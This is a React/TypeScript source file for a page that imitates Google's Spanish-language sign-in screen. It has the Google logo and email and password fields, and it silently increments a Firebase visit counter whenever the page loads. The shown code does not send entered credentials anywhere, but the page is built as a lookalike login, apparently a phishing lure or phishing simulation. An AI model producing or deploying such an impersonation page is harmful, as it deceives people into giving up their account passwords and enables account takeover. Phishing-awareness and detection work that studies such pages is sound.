import React, { useEffect, useState } from 'react';
import './theme/style.css';
import logo from './theme/google.png';
import TextField from '@material-ui/core/TextField';
import { db } from './firebaseconfig';


interface Contador{
  cantidadFire:number;
}

function App() {
  
  useEffect(() => {
    guardarContador();
  }, [])

  const guardarContador=async()=>{
    let {docs}= await db.collection('contador').get();
    if (docs.length==0) {
      await db.collection('contador').add({
        cantidadFire:0
      });
      return;
    }
    
    const nuevoEstado = docs.map((item)=>({id:item.id,...item.data()}));
    let idDoc=nuevoEstado[0].id.toString();
    const datoConta =await db.collection('contador').doc(idDoc).get();
    const {cantidadFire}:any= datoConta.data();
    let cantidad:number=parseInt(cantidadFire)+1;


    
    //Cargar contador
    let datosContador:Contador={
      cantidadFire:cantidad
    }
    await db.collection('contador').doc(idDoc).set({...datosContador,cantidadFire:cantidad,algo:cantidad});
  }

  return (
    
    <div className="maindiv" style={{ width:448, height:550}}>
     <img src={logo} alt="Google"/>
     <h1 style={{fontWeight:'bold',marginTop:20, marginBottom:15}}>Iniciar sesión</h1>
     <h3>Utiliza tu cuenta de Google</h3>
     <form action="">
     <div className="inputs" style={{marginTop:20}}>
       <div className="Fields" style={{width:'100%'}}>
         <div className="Fieldset">
         <TextField id="standard-basic" label="Correo electrónico o teléfono" variant='filled' style={{width:'100%'}} required />
         </div>
       </div>
       <div className="Fields" style={{width:'100%'}}>
         <div className="Fieldset" >
     
           <TextField id="standar-basic" label="Introduce tu contraseña" variant='filled' style={{width:'100%'}} type='Password' required />
         </div>
       </div>
     </div>
     <div style={{marginTop:-30,textAlign:'start'}}>
     <a href="/" style={{fontSize:13, fontWeight:'bold', textDecoration:'none',
                        fontFamily: 'Noto Sans', 
                        color:'#1A73E7',
                        }}>¿Has olvidado tu correo electrónico?</a>
     </div>
    <div style={{textAlign:'start',marginTop:30, marginBottom:25}}>
    <p style={{fontSize:13, fontFamily:'Noto Sans'}}>¿No es tu ordenador? Usa el modo invitados para iniciar sesión de forma privada. <strong>Más información</strong></p>
    </div>
       <input type="submit" value="Iniciar Sesión" className='btn btn-primary'/>
       </form>
  
    </div>
  




  );
}


export default App;
